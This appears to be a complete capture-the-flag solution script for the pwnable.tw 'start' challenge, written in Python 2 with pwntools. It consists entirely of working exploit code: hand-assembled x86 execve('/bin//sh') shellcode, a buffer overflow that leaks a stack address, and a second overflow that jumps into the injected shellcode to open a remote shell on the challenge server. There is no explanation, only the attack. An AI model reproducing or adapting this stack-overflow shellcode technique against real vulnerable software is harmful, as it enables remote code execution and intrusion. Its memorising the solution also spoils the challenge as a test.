from pwn import *

shellcode = ''
shellcode += "\x6a\x0b"
shellcode += "\x58"
shellcode += "\x31\xf6"
shellcode += "\x56"
shellcode += "\x68\x2f\x2f\x73\x68"
shellcode += "\x68\x2f\x62\x69\x6e"
shellcode += "\x89\xe3"
shellcode += "\x31\xc9"
shellcode += "\x89\xca"
shellcode += "\xcd\x80"

#p = process(['/home/etenal/pwnable.tw/start/start'])
p = remote('chall.pwnable.tw',10000)
p.send('A'*20+p32(0x08048087))
p.recvuntil(':')
stack_addr = int(p.recv(4)[::-1].encode('hex'),16)
print hex(stack_addr)
p.sendline('A'*20+p32(stack_addr+20)+shellcode)
p.interactive()
